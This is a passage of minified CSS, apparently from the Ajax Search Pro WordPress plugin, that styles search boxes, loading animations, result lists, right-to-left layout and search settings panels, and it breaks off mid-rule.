.asp_ac_autocomplete_dropdown>div.active{background:#0097CF;color:#FFF}.rtl .asp_content,.rtl .asp_nores,.rtl .asp_content *,.rtl .asp_nores *,.rtl .searchsettings form{text-align:right !important;direction:rtl !important}.rtl .asp_nores>*{display:inline-block}.rtl .searchsettings .asp_option{flex-direction:row-reverse !important;-webkit-flex-direction:row-reverse !important}.rtl .asp_option{direction:ltr}.rtl .asp_label,.rtl .asp_option div.asp_option_label{text-align:right !important}.rtl .asp_label{max-width:1000px !important;width:100%;direction:rtl !important}.rtl .asp_label input[type=radio]{margin:0 0 0 6px !important}.rtl .asp_option_cat_level-0 div.asp_option_label{font-weight:bold !important}.rtl fieldset .asp_option_cat_level-1{margin-right:12px !important;margin-left:0}.rtl fieldset .asp_option_cat_level-2{margin-right:24px !important;margin-left:0}.rtl fieldset .asp_option_cat_level-3{margin-right:36px !important;margin-left:0}.rtl .searchsettings legend{text-align:right !important;display:block;width:100%}.rtl .searchsettings input[type=text],.rtl .searchsettings select{direction:rtl !important;text-align:right !important}.rtl div.asp_w.asp_s.searchsettings form,.rtl div.asp_w.asp_sb.searchsettings form{flex-direction:row-reverse !important}.rtl div.horizontal.asp_r div.item{float:right !important}.rtl p.asp-try{direction:rtl;text-align:right;margin-right:10px;width:auto !important}.asp_elementor_nores{text-align:center}.elementor-sticky__spacer .asp_w,.elementor-sticky__spacer .asp-try{visibility:hidden !important;opacity:0 !important;z-index:-1 !important}</style><style id='asp-instance-6'>div[id*='ajaxsearchpro6_'] div.asp_loader,div[id*='ajaxsearchpro6_'] div.asp_loader *{box-sizing:border-box !important;margin:0;padding:0;box-shadow:none}div[id*='ajaxsearchpro6_'] div.asp_loader{box-sizing:border-box;display:flex;flex:0 1 auto;flex-direction:column;flex-grow:0;flex-shrink:0;flex-basis:28px;max-width:100%;max-height:100%;align-items:center;justify-content:center}div[id*='ajaxsearchpro6_'] div.asp_loader-inner{width:100%;margin:0 auto;text-align:center;height:100%}@-webkit-keyframes scale{0%{-webkit-transform:scale(1);transform:scale(1);opacity:1}45%{-webkit-transform:scale(0.1);transform:scale(0.1);opacity:0.7}80%{-webkit-transform:scale(1);transform:scale(1);opacity:1}}@keyframes scale{0%{-webkit-transform:scale(1);transform:scale(1);opacity:1}45%{-webkit-transform:scale(0.1);transform:scale(0.1);opacity:0.7}80%{-webkit-transform:scale(1);transform:scale(1);opacity:1}}div[id*='ajaxsearchpro6_'] div.asp_ball-pulse>div:nth-child(0){-webkit-animation:scale 0.75s -0.36s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.36s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchpro6_'] div.asp_ball-pulse>div:nth-child(1){-webkit-animation:scale 0.75s -0.24s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.24s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchpro6_'] div.asp_ball-pulse>div:nth-child(2){-webkit-animation:scale 0.75s -0.12s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.12s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchpro6_'] div.asp_ball-pulse>div:nth-child(3){-webkit-animation:scale 0.75s 0s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s 0s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchpro6_'] div.asp_ball-pulse>div{background-color:rgb(74,137,191);width:20%;height:20%;border-radius:100%;margin:0;margin-top:40%;margin-left:10%;float:left;-webkit-animation-fill-mode:both;animation-fill-mode:both;display:block;vertical-align:text-top}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_loader,div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_loader *{box-sizing:border-box !important;margin:0;padding:0;box-shadow:none}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_loader{box-sizing:border-box;display:flex;flex:0 1 auto;flex-direction:column;flex-grow:0;flex-shrink:0;flex-basis:28px;max-width:100%;max-height:100%;align-items:center;justify-content:center}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_loader-inner{width:100%;margin:0 auto;text-align:center;height:100%}@-webkit-keyframes scale{0%{-webkit-transform:scale(1);transform:scale(1);opacity:1}45%{-webkit-transform:scale(0.1);transform:scale(0.1);opacity:0.7}80%{-webkit-transform:scale(1);transform:scale(1);opacity:1}}@keyframes scale{0%{-webkit-transform:scale(1);transform:scale(1);opacity:1}45%{-webkit-transform:scale(0.1);transform:scale(0.1);opacity:0.7}80%{-webkit-transform:scale(1);transform:scale(1);opacity:1}}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_ball-pulse>div:nth-child(0){-webkit-animation:scale 0.75s -0.36s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.36s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_ball-pulse>div:nth-child(1){-webkit-animation:scale 0.75s -0.24s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.24s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_ball-pulse>div:nth-child(2){-webkit-animation:scale 0.75s -0.12s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.12s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_ball-pulse>div:nth-child(3){-webkit-animation:scale 0.75s 0s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s 0s infinite cubic-bezier(.2,.68,.18,1.08)}div[id*='ajaxsearchprores6_'] .asp_res_loader div.asp_ball-pulse>div{background-color:rgb(74,137,191);width:20%;height:20%;border-radius:100%;margin:0;margin-top:40%;margin-left:10%;float:left;-webkit-animation-fill-mode:both;animation-fill-mode:both;display:block;vertical-align:text-top}#ajaxsearchpro6_1 div.asp_loader,#ajaxsearchpro6_2 div.asp_loader,#ajaxsearchpro6_1 div.asp_loader *,#ajaxsearchpro6_2 div.asp_loader *{box-sizing:border-box !important;margin:0;padding:0;box-shadow:none}#ajaxsearchpro6_1 div.asp_loader,#ajaxsearchpro6_2 div.asp_loader{box-sizing:border-box;display:flex;flex:0 1 auto;flex-direction:column;flex-grow:0;flex-shrink:0;flex-basis:28px;max-width:100%;max-height:100%;align-items:center;justify-content:center}#ajaxsearchpro6_1 div.asp_loader-inner,#ajaxsearchpro6_2 div.asp_loader-inner{width:100%;margin:0 auto;text-align:center;height:100%}@-webkit-keyframes scale{0%{-webkit-transform:scale(1);transform:scale(1);opacity:1}45%{-webkit-transform:scale(0.1);transform:scale(0.1);opacity:0.7}80%{-webkit-transform:scale(1);transform:scale(1);opacity:1}}@keyframes scale{0%{-webkit-transform:scale(1);transform:scale(1);opacity:1}45%{-webkit-transform:scale(0.1);transform:scale(0.1);opacity:0.7}80%{-webkit-transform:scale(1);transform:scale(1);opacity:1}}#ajaxsearchpro6_1 div.asp_ball-pulse>div:nth-child(0),#ajaxsearchpro6_2 div.asp_ball-pulse>div:nth-child(0){-webkit-animation:scale 0.75s -0.36s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.36s infinite cubic-bezier(.2,.68,.18,1.08)}#ajaxsearchpro6_1 div.asp_ball-pulse>div:nth-child(1),#ajaxsearchpro6_2 div.asp_ball-pulse>div:nth-child(1){-webkit-animation:scale 0.75s -0.24s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.24s infinite cubic-bezier(.2,.68,.18,1.08)}#ajaxsearchpro6_1 div.asp_ball-pulse>div:nth-child(2),#ajaxsearchpro6_2 div.asp_ball-pulse>div:nth-child(2){-webkit-animation:scale 0.75s -0.12s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s -0.12s infinite cubic-bezier(.2,.68,.18,1.08)}#ajaxsearchpro6_1 div.asp_ball-pulse>div:nth-child(3),#ajaxsearchpro6_2 div.asp_ball-pulse>div:nth-child(3){-webkit-animation:scale 0.75s 0s infinite cubic-bezier(.2,.68,.18,1.08);animation:scale 0.75s 0s infinite cubic-bezier(.2,.68,.18,1.08)}#ajaxsearchpro6_1 div.asp_ball-pulse>div,#ajaxsearchpro6_2 div.asp_ball-pulse>div{background-color:rgb(74,137,191);width:20%;height:20%;border-radius:100%;margin:0;margin-top:40%;margin-left:10%;float:left;-webkit-animation-fill-mode:both;animation-fill-mode:both;display:block;vertical-align:text-top}@-webkit-keyframes asp_an_fadeInDown{0%{opacity:0;-webkit-transform:translateY(-20px)}100%{opacity:1;-webkit-transform:translateY(0)}}@keyframes asp_an_fadeInDown{0%{opacity:0;transform:translateY(-20px)}100%{opacity:1;transform:translateY(0)}}.asp_an_fadeInDown{-webkit-animation-name:asp_an_fadeInDown;animation-name:asp_an_fadeInDown}div.asp_r.asp_r_6,div.asp_r.asp_r_6 *,div.asp_m.asp_m_6,div.asp_m.asp_m_6 *,div.asp_s.asp_s_6,div.asp_s.asp_s_6 *{-webkit-box-sizing:content-box;-moz-box-sizing:content-box;-ms-box-sizing:content-box;-o-box-sizing:content-box;box-sizing:content-box;border:0;border-radius:0;text-transform:none;text-shadow:none;box-shadow:none;text-decoration:none;text-align:left;letter-spacing:normal}div.asp_r.asp_r_6,div.asp_m.asp_m_6,div.asp_s.asp_s_6{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box}div.asp_r.asp_r_6,div.asp_r.asp_r_6 *,div.asp_m.asp_m_6,div.asp_m.asp_m_6 *,div.asp_s.asp_s_6,div.asp_s.asp_s_6 *{padding:0;margin:0}.wpdreams_clear{clear:both}.asp_w_container_6{width:100%}#ajaxsearchpro6_1,#ajaxsearchpro6_2,div.asp_m.asp_m_6{width:100%;height:auto;max-height:none;border-radius:5px;background:#d1eaff;margin-top:0;margin-bottom:0;background:transparent;overflow:hidden;border:1px solid rgba(0,0,0,0.31);border-radius:0;box-shadow:0 4px 28px -13px #000}#ajaxsearchpro6_1 .probox,#ajaxsearchpro6_2 .probox,div.asp_m.asp_m_6 .probox{margin:0;height:50px;background-image:-moz-radial-gradient(center,ellipse cover,rgb(255,255,255),rgb(255,255,255));background-image:-webkit-gradient(radial,center center,0px,center center,100%,rgb(255,255,255),rgb(255,255,255));background-image:-webkit-radial-gradient(center,ellipse cover,rgb(255,255,255),rgb(255,255,255));background-image:-o-radial-gradient(center,ellipse cover,rgb(255,255,255),rgb(255,255,255));background-image:-ms-radial-gradient(center,ellipse cover,rgb(255,255,255),rgb(255,255,255));background-image:radial-gradient(ellipse at center,rgb(255,255,255),rgb(255,255,255));border:0 solid rgba(0,0,0,0);border-radius:0;box-shadow:none}p[id*=asp-try-6]{color:rgb(85,85,85) !important;display:block}div.asp_main_container+[id*=asp-try-6]{width:100%}p[id*=asp-try-6] a{color:rgb(255,181,86) !important}p[id*=asp-try-6] a:after{color:rgb(85,85,85) !important;display:inline;content:','}p[id*=asp-try-6] a:last-child:after{display:none}#ajaxsearchpro6_1 .probox .proinput,#ajaxsearchpro6_2 .probox .proinput,div.asp_m.asp_m_6 .probox .proinput{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;line-height:15px;text-shadow:none;line-height:normal;flex-grow:1;order:5;margin:0 0 0 10px;padding:0 5px}#ajaxsearchpro6_1 .probox .proinput input.orig,#ajaxsearchpro6_2 .probox .proinput input.orig,div.asp_m.asp_m_6 .probox .proinput input.orig{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;line-height:15px;text-shadow:none;line-height:normal;border:0;box-shadow:none;height:50px;position:relative;z-index:2;padding:0 !important;padding-top:2px !important;margin:-1px 0 0 -4px !important;width:100%;background:transparent !important}#ajaxsearchpro6_1 .probox .proinput input.autocomplete,#ajaxsearchpro6_2 .probox .proinput input.autocomplete,div.asp_m.asp_m_6 .probox .proinput input.autocomplete{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;line-height:15px;text-shadow:none;line-height:normal;opacity:0.25;height:50px;display:block;position:relative;z-index:1;padding:0 !important;margin:-1px 0 0 -4px !important;margin-top:-50px !important;width:100%;background:transparent !important}.rtl #ajaxsearchpro6_1 .probox .proinput input.orig,.rtl #ajaxsearchpro6_2 .probox .proinput input.orig,.rtl #ajaxsearchpro6_1 .probox .proinput input.autocomplete,.rtl #ajaxsearchpro6_2 .probox .proinput input.autocomplete,.rtl div.asp_m.asp_m_6 .probox .proinput input.orig,.rtl div.asp_m.asp_m_6 .probox .proinput input.autocomplete{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;line-height:15px;text-shadow:none;line-height:normal;direction:rtl;text-align:right}.rtl #ajaxsearchpro6_1 .probox .proinput,.rtl #ajaxsearchpro6_2 .probox .proinput,.rtl div.asp_m.asp_m_6 .probox .proinput{margin-right:2px}.rtl #ajaxsearchpro6_1 .probox .proloading,.rtl #ajaxsearchpro6_1 .probox .proclose,.rtl #ajaxsearchpro6_2 .probox .proloading,.rtl #ajaxsearchpro6_2 .probox .proclose,.rtl div.asp_m.asp_m_6 .probox .proloading,.rtl div.asp_m.asp_m_6 .probox .proclose{order:3}div.asp_m.asp_m_6 .probox .proinput input.orig::-webkit-input-placeholder{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;text-shadow:none;opacity:0.85}div.asp_m.asp_m_6 .probox .proinput input.orig::-moz-placeholder{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;text-shadow:none;opacity:0.85}div.asp_m.asp_m_6 .probox .proinput input.orig:-ms-input-placeholder{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;text-shadow:none;opacity:0.85}div.asp_m.asp_m_6 .probox .proinput input.orig:-moz-placeholder{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;text-shadow:none;opacity:0.85;line-height:normal !important}#ajaxsearchpro6_1 .probox .proinput input.autocomplete,#ajaxsearchpro6_2 .probox .proinput input.autocomplete,div.asp_m.asp_m_6 .probox .proinput input.autocomplete{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;line-height:15px;text-shadow:none;line-height:normal;border:0;box-shadow:none}#ajaxsearchpro6_1 .probox .proloading,#ajaxsearchpro6_1 .probox .proclose,#ajaxsearchpro6_1 .probox .promagnifier,#ajaxsearchpro6_1 .probox .prosettings,#ajaxsearchpro6_2 .probox .proloading,#ajaxsearchpro6_2 .probox .proclose,#ajaxsearchpro6_2 .probox .promagnifier,#ajaxsearchpro6_2 .probox .prosettings,div.asp_m.asp_m_6 .probox .proloading,div.asp_m.asp_m_6 .probox .proclose,div.asp_m.asp_m_6 .probox .promagnifier,div.asp_m.asp_m_6 .probox .prosettings{width:50px;height:50px;flex:0 0 50px;flex-grow:0;order:7;text-align:center}#ajaxsearchpro6_1 .probox .proclose svg,#ajaxsearchpro6_2 .probox .proclose svg,div.asp_m.asp_m_6 .probox .proclose svg{fill:rgb(254,254,254);background:rgb(51,51,51);box-shadow:0 0 0 2px rgba(255,255,255,0.9);border-radius:50%;box-sizing:border-box;margin-left:-10px;margin-top:-10px;padding:4px}#ajaxsearchpro6_1 .probox .proloading,#ajaxsearchpro6_2 .probox .proloading,div.asp_m.asp_m_6 .probox .proloading{width:50px;height:50px;min-width:50px;min-height:50px;max-width:50px;max-height:50px}#ajaxsearchpro6_1 .probox .proloading .asp_loader,#ajaxsearchpro6_2 .probox .proloading .asp_loader,div.asp_m.asp_m_6 .probox .proloading .asp_loader{width:46px;height:46px;min-width:46px;min-height:46px;max-width:46px;max-height:46px}#ajaxsearchpro6_1 .probox .promagnifier,#ajaxsearchpro6_2 .probox .promagnifier,div.asp_m.asp_m_6 .probox .promagnifier{width:auto;height:50px;flex:0 0 auto;order:7;-webkit-flex:0 0 auto;-webkit-order:7}div.asp_m.asp_m_6 .probox .promagnifier:focus-visible{outline:black outset}#ajaxsearchpro6_1 .probox .proloading .innericon,#ajaxsearchpro6_2 .probox .proloading .innericon,#ajaxsearchpro6_1 .probox .proclose .innericon,#ajaxsearchpro6_2 .probox .proclose .innericon,#ajaxsearchpro6_1 .probox .promagnifier .innericon,#ajaxsearchpro6_2 .probox .promagnifier .innericon,#ajaxsearchpro6_1 .probox .prosettings .innericon,#ajaxsearchpro6_2 .probox .prosettings .innericon,div.asp_m.asp_m_6 .probox .proloading .innericon,div.asp_m.asp_m_6 .probox .proclose .innericon,div.asp_m.asp_m_6 .probox .promagnifier .innericon,div.asp_m.asp_m_6 .probox .prosettings .innericon{text-align:center}#ajaxsearchpro6_1 .probox .promagnifier .innericon,#ajaxsearchpro6_2 .probox .promagnifier .innericon,div.asp_m.asp_m_6 .probox .promagnifier .innericon{display:block;width:50px;height:50px;float:right}#ajaxsearchpro6_1 .probox .promagnifier .asp_text_button,#ajaxsearchpro6_2 .probox .promagnifier .asp_text_button,div.asp_m.asp_m_6 .probox .promagnifier .asp_text_button{display:block;width:auto;height:50px;float:left;margin:0;padding:0 10px;font-weight:normal;font-family:"Open Sans";color:rgb(255,255,255);font-size:15px;line-height:auto;text-shadow:none;line-height:50px}#ajaxsearchpro6_1 .probox .promagnifier .innericon svg,#ajaxsearchpro6_2 .probox .promagnifier .innericon svg,div.asp_m.asp_m_6 .probox .promagnifier .innericon svg{fill:rgb(255,255,255)}#ajaxsearchpro6_1 .probox .prosettings .innericon svg,#ajaxsearchpro6_2 .probox .prosettings .innericon svg,div.asp_m.asp_m_6 .probox .prosettings .innericon svg{fill:rgb(255,255,255)}#ajaxsearchpro6_1 .probox .promagnifier,#ajaxsearchpro6_2 .probox .promagnifier,div.asp_m.asp_m_6 .probox .promagnifier{width:auto;height:50px;background-image:-webkit-linear-gradient(180deg,rgba(61,61,61,1),rgba(61,61,61,1));background-image:-moz-linear-gradient(180deg,rgba(61,61,61,1),rgba(61,61,61,1));background-image:-o-linear-gradient(180deg,rgba(61,61,61,1),rgba(61,61,61,1));background-image:-ms-linear-gradient(180deg,rgba(61,61,61,1) 0,rgba(61,61,61,1) 100%);background-image:linear-gradient(180deg,rgba(61,61,61,1),rgba(61,61,61,1));background-position:center center;background-repeat:no-repeat;order:11;-webkit-order:11;float:right;border:0 solid rgb(74,144,226);border-radius:0;box-shadow:0 0 0 0 rgba(255,255,255,0.64);cursor:pointer;background-size:100% 100%;background-position:center center;background-repeat:no-repeat;cursor:pointer}#ajaxsearchpro6_1 .probox .prosettings,#ajaxsearchpro6_2 .probox .prosettings,div.asp_m.asp_m_6 .probox .prosettings{width:50px;height:50px;background-image:-webkit-linear-gradient(175deg,rgb(74,144,226),rgb(74,144,226));background-image:-moz-linear-gradient(175deg,rgb(74,144,226),rgb(74,144,226));background-image:-o-linear-gradient(175deg,rgb(74,144,226),rgb(74,144,226));background-image:-ms-linear-gradient(175deg,rgb(74,144,226) 0,rgb(74,144,226) 100%);background-image:linear-gradient(175deg,rgb(74,144,226),rgb(74,144,226));background-position:center center;background-repeat:no-repeat;order:2;-webkit-order:2;float:left;border:0 solid rgb(255,255,255);border-radius:0;box-shadow:0 0 0 0 rgba(255,255,255,0.64) inset;cursor:pointer;background-size:100% 100%;align-self:flex-end}#ajaxsearchprores6_1,#ajaxsearchprores6_2,div.asp_r.asp_r_6{position:absolute;z-index:11000;width:auto;margin:12px 0 0 0}#ajaxsearchprores6_1 .asp_nores,#ajaxsearchprores6_2 .asp_nores,div.asp_r.asp_r_6 .asp_nores{border:0 solid rgb(0,0,0);border-radius:0;box-shadow:0 5px 5px -5px #dfdfdf;padding:6px 12px 6px 12px;margin:0;font-weight:normal;font-family:inherit;color:rgba(74,74,74,1);font-size:1rem;line-height:1.2rem;text-shadow:none;font-weight:normal;background:rgb(255,255,255)}#ajaxsearchprores6_1 .asp_nores .asp_nores_kw_suggestions,#ajaxsearchprores6_2 .asp_nores .asp_nores_kw_suggestions,div.asp_r.asp_r_6 .asp_nores .asp_nores_kw_suggestions{color:rgba(234,67,53,1);font-weight:normal}#ajaxsearchprores6_1 .asp_nores .asp_keyword,#ajaxsearchprores6_2 .asp_nores .asp_keyword,div.asp_r.asp_r_6 .asp_nores .asp_keyword{padding:0 8px 0 0;cursor:pointer;color:rgba(20,84,169,1);font-weight:bold}#ajaxsearchprores6_1 .asp_results_top,#ajaxsearchprores6_2 .asp_results_top,div.asp_r.asp_r_6 .asp_results_top{background:rgb(255,255,255);border:1px none rgb(81,81,81);border-radius:0;padding:6px 12px 6px 12px;margin:0 0 4px 0;text-align:center;font-weight:normal;font-family:"Open Sans";color:rgb(81,81,81);font-size:13px;line-height:16px;text-shadow:none}#ajaxsearchprores6_1 .results .item,#ajaxsearchprores6_2 .results .item,div.asp_r.asp_r_6 .results .item{height:auto;background:rgb(255,255,255)}#ajaxsearchprores6_1 .results .item.hovered,#ajaxsearchprores6_2 .results .item.hovered,div.asp_r.asp_r_6 .results .item.hovered{background-image:-moz-radial-gradient(center,ellipse cover,rgb(244,244,244),rgb(246,246,246));background-image:-webkit-gradient(radial,center center,0px,center center,100%,rgb(244,244,244),rgb(246,246,246));background-image:-webkit-radial-gradient(center,ellipse cover,rgb(244,244,244),rgb(246,246,246));background-image:-o-radial-gradient(center,ellipse cover,rgb(244,244,244),rgb(246,246,246));background-image:-ms-radial-gradient(center,ellipse cover,rgb(244,244,244),rgb(246,246,246));background-image:radial-gradient(ellipse at center,rgb(244,244,244),rgb(246,246,246))}#ajaxsearchprores6_1 .results .item .asp_image,#ajaxsearchprores6_2 .results .item .asp_image,div.asp_r.asp_r_6 .results .item .asp_image{background-size:cover;background-repeat:no-repeat}#ajaxsearchprores6_1 .results .item .asp_item_overlay_img,#ajaxsearchprores6_2 .results .item .asp_item_overlay_img,div.asp_r.asp_r_6 .results .item .asp_item_overlay_img{background-size:cover;background-repeat:no-repeat}#ajaxsearchprores6_1 .results .item .asp_content,#ajaxsearchprores6_2 .results .item .asp_content,div.asp_r.asp_r_6 .results .item .asp_content{overflow:hidden;background:transparent;margin:0;padding:0 10px}#ajaxsearchprores6_1 .results .item .asp_content h3,#ajaxsearchprores6_2 .results .item .asp_content h3,div.asp_r.asp_r_6 .results .item .asp_content h3{margin:0;padding:0;display:inline-block;line-height:inherit;font-weight:bold;font-family:"Lato";color:rgb(0,0,0);font-size:14px;line-height:1.55em;text-shadow:none}#ajaxsearchprores6_1 .results .item .asp_content h3 a,#ajaxsearchprores6_2 .results .item .asp_content h3 a,div.asp_r.asp_r_6 .results .item .asp_content h3 a{margin:0;padding:0;line-height:inherit;display:block;font-weight:bold;font-family:"Lato";color:rgb(0,0,0);font-size:14px;line-height:1.55em;text-shadow:none}#ajaxsearchprores6_1 .results .item .asp_content h3 a:hover,#ajaxsearchprores6_2 .results .item .asp_content h3 a:hover,div.asp_r.asp_r_6 .results .item .asp_content h3 a:hover{font-weight:bold;font-family:"Lato";color:rgb(0,0,0);font-size:14px;line-height:1.55em;text-shadow:none}#ajaxsearchprores6_1 .results .item div.etc,#ajaxsearchprores6_2 .results .item div.etc,div.asp_r.asp_r_6 .results .item div.etc{padding:0;font-size:13px;line-height:1.3em;margin-bottom:6px}#ajaxsearchprores6_1 .results .item .etc .asp_author,#ajaxsearchprores6_2 .results .item .etc .asp_author,div.asp_r.asp_r_6 .results .item .etc .asp_author{padding:0;font-weight:bold;font-family:"Open Sans";color:rgb(161,161,161);font-size:11px;line-height:13px;text-shadow:none}#ajaxsearchprores6_1 .results .item .etc .asp_date,#ajaxsearchprores6_2 .results .item .etc .asp_date,div.asp_r.asp_r_6 .results .item .etc .asp_date{margin:0 0 0 10px;padding:0;font-weight:normal;font-family:"Open Sans";color:rgb(173,173,173);font-size:11px;line-height:15px;text-shadow:none}#ajaxsearchprores6_1 .results .item div.asp_content,#ajaxsearchprores6_2 .results .item div.asp_content,div.asp_r.asp_r_6 .results .item div.asp_content{margin:0;padding:0;font-weight:normal;font-family:"Open Sans";color:rgb(74,74,74);font-size:13px;line-height:1.35em;text-shadow:none}#ajaxsearchprores6_1 span.highlighted,#ajaxsearchprores6_2 span.highlighted,div.asp_r.asp_r_6 span.highlighted{font-weight:bold;color:rgba(217,49,43,1);background-color:rgba(238,238,238,1)}#ajaxsearchprores6_1 p.showmore,#ajaxsearchprores6_2 p.showmore,div.asp_r.asp_r_6 p.showmore{text-align:center;font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;line-height:15px;text-shadow:none}#ajaxsearchprores6_1 p.showmore a,#ajaxsearchprores6_2 p.showmore a,div.asp_r.asp_r_6 p.showmore a{font-weight:normal;font-family:"Open Sans";color:rgb(0,0,0);font-size:12px;line-height:15px;text-shadow:none;padding:10px 5px;margin:0 auto;background:rgba(255,255,255,1);display:block;text-align:center}#ajaxsearchprores6_1 .asp_res_loader,#ajaxsearchprores6_2 .asp_res_loader,div.asp_r.asp_r_6 .asp_res_loader{background:rgb(255,255,255);height:200px;padding:10px}#ajaxsearchprores6_1.isotopic .asp_res_loader,#ajaxsearchprores6_2.isotopic .asp_res_loader,div.asp_r.asp_r_6.isotopic .asp_res_loader{background:rgba(255,255,255,0)}#ajaxsearchprores6_1 .asp_res_loader .asp_loader,#ajaxsearchprores6_2 .asp_res_loader .asp_loader,div.asp_r.asp_r_6 .asp_res_loader .asp_loader{height:200px;width:200px;margin:0 auto}div.asp_s.asp_s_6.searchsettings,div.asp_s.asp_s_6.searchsettings,div.asp_s.asp_s_6.searchsettings{direction:ltr;padding:0;background-image:-webkit-linear-gradient(185deg,rgb(255,255,255),rgb(255,255,255));background-image:-moz-linear-gradient(185deg,rgb(255,255,255),rgb(255,255,255));background-image:-o-linear-gradient(185deg,rgb(255,255,255),rgb(255,255,255));background-image:-ms-linear-gradient(185deg,rgb(255,255,255) 0,rgb(255,255,255) 100%);background-image:linear-gradient(185deg,rgb(255,255,255),rgb(255,255,255));box-shadow:0 0 0 2px rgb(74,144,226);;max-width:208px;z-index:2}div.asp_s.asp_s_6.searchsettings.asp_s,div.asp_s.asp_s_6.searchsettings.asp_s,div.asp_s.asp_s_6.searchsettings.asp_s{z-index:11001}#ajaxsearchprobsettings6_1.searchsettings,#ajaxsearchprobsettings6_2.searchsettings,div.asp_sb.asp_sb_6.searchsettings{max-width:none}div.asp_s.asp_s_6.searchsettings form,div.asp_s.asp_s_6.searchsettings form,div.asp_s.asp_s_6.searchsettings form{display:flex}div.asp_sb.asp_sb_6.searchsettings form,div.asp_sb.asp_sb_6.searchsettings form,div.asp_sb.asp_sb_6.searchsettings form{display:flex}#ajaxsearchprosettings6_1.searchsettings div.asp_option_label,#ajaxsearchprosettings6_2.searchsettings div.asp_option_label,#ajaxsearchprosettings6_1.searchsettings .asp_label,#ajaxsearchprosettings6_2.searchsettings .asp_label,div.asp_s.asp_s_6.searchsettings div.asp_option_label,div.asp_s.asp_s_6.searchsettings .asp_label{font-weight:bold;font-family:"Open Sans";color:rgb(43,43,43);font-size:12px;line-height:15px;text-shadow:none}#ajaxsearchprosettings6_1.searchsettings .asp_option_inner .asp_option_checkbox,#ajaxsearchprosettings6_2.searchsettings .asp_option_inner .asp_option_checkbox,div.asp_sb.asp_sb_6.searchsettings .asp_option_inner .asp_option_checkbox,div.asp_s.asp_s_6.searchsettings .asp_option_inner .asp_option_checkbox{background-image:-webkit-linear-gradient(180deg,rgb(34,34,34),rgb(69,72,77));background-image:-moz-linear-gradient(180deg,rgb(34,34,34),rgb(69,72,77));background-image:-o-linear-gradient(180deg,rgb(34,34,34),rgb(69,72,77));background-image:-ms-linear-gradient(180deg,rgb(34,34,34) 0,rgb(69,72,77) 100%);background-image:linear-gradient(180deg,rgb(34,34,34),rgb(69,72,77))}#ajaxsearchprosettings6_1.searchsettings .asp_option_inner .asp_option_checkbox:after,#ajaxsearchprosettings6_2.searchsettings .asp_option_inner .asp_option_checkbox:after,#ajaxsearchprobsettings6_1.searchsettings .asp_option_inner .asp_option_checkbox:after,#ajaxsearchprobsettings6_2.searchsettings .asp_option_inner .asp_option_checkbox:after,div.asp_sb.asp_sb_6.searchsettings .asp_option_inner .asp_option_checkbox:after,div.asp_s.asp_s_6.searchsettings .asp_option_inner .asp_option_checkbox:after{font-family:'asppsicons2';border:none;content:"\e800";display:block;position:absolute;top:0;left:0;font-size:11px;color:rgb(255,255,255);margin:1px 0 0 0 !important;line-height:17px;text-align:center;text-decoration:none;text-shadow:none}div.asp_sb.asp_sb_6.searchsettings .asp_sett_scroll,div.asp_s.asp_s_6.searchsettings .asp_sett_scroll{scrollbar-width:thin;scrollbar-color:rgba(0,0,0,0.5) transparent}div.asp_sb.asp_sb_6.searchsettings .asp_sett_scroll::-webkit-scrollbar,div.asp_s.asp_s_6.searchsettings .asp_sett_scroll::-webkit-scrollbar{width:7px}div.asp_sb.asp_sb_6.searchsettings .asp_sett_scroll::-webkit-scrollbar-track,div.asp_s.asp_s_6.searchsettings .asp_sett_scroll::-webkit-scrollbar-track{background:transparent}div.asp_sb.asp_sb_6.searchsettings .asp_sett_scroll::-webkit-scrollbar-thumb,div.asp_s.asp_s_6.searchsettings .asp_sett_scroll::-webkit-scrollbar-thumb{background:rgba(0,0,0,0.5);border-radius:5px;border:none}#ajaxsearchprosettings6_1.searchsettings .asp_sett_scroll,#ajaxsearchprosettings6_2.searchsettings .asp_sett_scroll,div.asp_s.asp_s_6.searchsettings .asp_sett_scroll{max-height:220px;overflow:auto}#ajaxsearchprobsettings6_1.searchsettings .asp_sett_scroll,#ajaxsearchprobsettings6_2.searchsettings .asp_sett_scroll,div.asp_sb.asp_sb_6.searchsettings .asp_sett_scroll{max-height:220px;overflow:auto}#ajaxsearchprosettings6_1.searchsettings 